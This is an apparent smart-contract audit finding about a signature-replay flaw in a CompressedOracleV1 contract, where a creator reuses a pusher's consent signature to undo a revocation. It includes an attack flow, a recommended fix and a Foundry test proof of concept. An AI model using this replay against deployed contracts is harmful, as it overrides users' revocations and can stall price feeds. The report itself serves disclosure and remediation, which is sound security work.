### Title
Pusher Consent Signature Replay Allows Creator to Re-establish Revoked Delegation, Redirecting Price Pushes and Staleing Pusher's Own Namespace Feeds - (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` in `CompressedOracleV1` does not consume or invalidate a pusher's consent signature after use. A creator who holds a valid (non-expired) consent signature can replay it an unlimited number of times to re-establish a delegation that the pusher already revoked via `revokePusher()`. The pusher's revocation is rendered ineffective for the entire lifetime of the original deadline, and the pusher's own namespace feeds become stale, breaking any pool that reads from them.

### Finding Description

`allowPushers` verifies the pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
```

There is no nonce, no used-signature bitmap, and no per-pusher revocation counter. The signature is valid for every call to `allowPushers` that supplies the same `(chainid, oracle, deadline, pusher, creator)` tuple, as long as `block.timestamp <= deadline`.

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
```

But the creator still holds the original signature. Because `allowPushers` does not mark the signature as consumed, the creator can immediately call `allowPushers` again with the identical arguments and re-write `namespaceRemapping[pusher] = creator`. This cycle can repeat indefinitely until the deadline expires.

The code comment itself acknowledges the partial risk ("an undated signature could re-establish a delegation after the pusher revoked it") and presents the deadline as the mitigation, but the deadline only bounds the replay window — it does not prevent replay within that window.

**Attack flow:**

1. Pusher signs consent with `deadline = now + 365 days` and hands it to creator.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers(deadline, [pusher], [sig])` with the **same** signature → `namespaceRemapping[pusher] = creator` again.
5. Steps 3–4 can repeat for up to 365 days.

After step 4, the pusher's `fallback()` pushes are routed to the creator's namespace:

```solidity
address creator = namespaceRemapping[msg.sender]; // = creator, not address(0)
if (creator == address(0)) creator = msg.sender;
```

The pusher's own namespace (`feedIdOf(pusher, slotId, pos)`) never receives updates, so its timestamp stays frozen. Any pool or `AnchoredPriceProvider` reading from the pusher's own namespace feeds will see a stale timestamp and either revert or consume a stale price.

### Impact Explanation

- **Broken revocation invariant:** `revokePusher()` is supposed to restore the pusher's autonomy over their own namespace. Within the deadline window it does not — the creator can undo it in the same block.
- **Pusher's own namespace goes stale:** Once the delegation is re-established, the pusher's bot continues pushing (to what it believes is its own namespace), but every write lands in the creator's namespace. The pusher's own feeds accumulate no new timestamps. Pools configured to read `feedIdOf(pusher, …)` will hit the `maxTimeDrift` staleness guard and revert, making swaps unusable.
- **Unauthorized price attribution:** The creator's namespace receives price data the pusher explicitly tried to stop providing, potentially feeding a pool with prices the pusher no longer vouches for.

### Likelihood Explanation

Low. The creator must have retained the original consent signature (it is transmitted off-chain), and must be willing to act adversarially. However, the signature is a plain bytes value that any creator would naturally store, and the replay requires only a single on-chain transaction with no additional cost beyond gas.

### Recommendation

Mark each consent signature as consumed after first use by storing a `mapping(bytes32 => bool) usedConsentSignatures` keyed on the signature hash (or on `keccak256(abi.encode(pusher, creator, deadline))`), and revert if the same key is presented again:

```solidity
mapping(bytes32 => bool) private _usedConsents;

function allowPushers(...) external {
    _ensureDeadline(deadline);
    for (...) {
        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
        );
        require(!_usedConsents[hash], "consent already used");
        require(pusher == ECDSA.recover(hash, signatures[i]));
        _usedConsents[hash] = true;
        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

Alternatively, include a per-pusher nonce in the signed message so that each consent is unique and cannot be replayed after revocation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayAfterRevoke() public {
        uint256 deadline = block.timestamp + 365 days;

        // Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // Creator replays the SAME signature — revocation undone
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds, no revert
        assertEq(oracle.namespaceRemapping(pusher), creator); // delegation re-established
    }
}
```
